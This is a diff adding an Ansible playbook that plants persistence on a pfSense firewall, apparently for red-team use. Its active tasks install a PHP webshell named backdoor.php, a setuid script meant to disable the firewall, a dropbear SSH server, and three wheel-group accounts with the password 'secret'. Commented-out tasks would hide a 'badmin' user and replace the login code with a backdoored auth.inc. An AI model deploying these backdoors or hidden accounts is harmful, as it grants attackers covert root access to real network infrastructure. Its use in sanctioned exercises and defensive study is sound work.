@@ -1,0 +1,79 @@
+---
+- name: Deploy to pfSense
+  hosts: trainstation
+  remote_user: root
+  become: yes
+
+  tasks:
+  
+    - name: Copy Webshell to pfsense
+      ansible.builtin.copy:
+        src: pfsense/webshell.php
+        dest: /usr/local/www/backdoor.php
+        owner: root
+        group: wheel
+        mode: '644'
+    
+    #- name: pfAPI
+    #  ansible.builtin.shell: pkg -C /dev/null add https://github.com/jaredhendrickson13/pfsense-api/releases/download/v2.0.0-dev-094eefe/pfSense-2.7.2-pkg-RESTAPI.pkg && /etc/rc.restart_webgui
+      
+    #- name: Copy over system user manager (hide badmin user)
+    #  ansible.builtin.copy:
+    #    src: pfsense/system_usermanager.php
+    #    dest: /usr/local/www/system_usermanager.php
+    
+    - name: Copy over stopfirewallfunc.sh (sets kern.securelevel=3)
+      ansible.builtin.copy:
+        src: pfsense/stopfirewallfunc.sh
+        dest: /usr/local/etc/firefunc
+        mode: '4751'
+        owner: root
+        group: wheel
+
+    - name: make dropbear dir
+      file:
+        path: /etc/dropbear/
+        state: directory
+    
+    - name: touch authorized keys
+      ansible.builtin.shell: touch /etc/dropbear/authorized_keys
+    
+    - name: Copy over dropbear
+      ansible.builtin.copy:
+        src: dropbear/dropbear_bsd
+        dest: /usr/sbin/dropbear
+        owner: root
+        group: wheel
+        mode: '755'
+
+    #- name: Run command on pfsense
+    #  ansible.builtin.shell: "/usr/sbin/dropbear -R"
+    
+    #Remember to update the server IP!
+    #- name: PFsense login backdoor
+    #  ansible.builtin.copy:
+    #    src: pfsense/backdoor_auth.inc
+    #    dest: /etc/inc/auth.inc
+
+    - name: Create a password for user jftp
+      user:
+        name: jftp
+        password: "{{ 'secret' | password_hash('sha512') }}"
+        groups: wheel
+        shell: /bin/tcsh
+        append: yes
+    - name: Create a password for user ansibleuser
+      user:
+        name: ansibleuser
+        password: "{{ 'secret' | password_hash('sha512') }}"
+        groups: wheel
+        shell: /bin/tcsh
+        append: yes
+    - name: Create a password for user BlackjackBill
+      user:
+        name: BlackjackBill
+        password: "{{ 'secret' | password_hash('sha512') }}"
+        groups: wheel
+        shell: /bin/tcsh
+        append: yes
+...
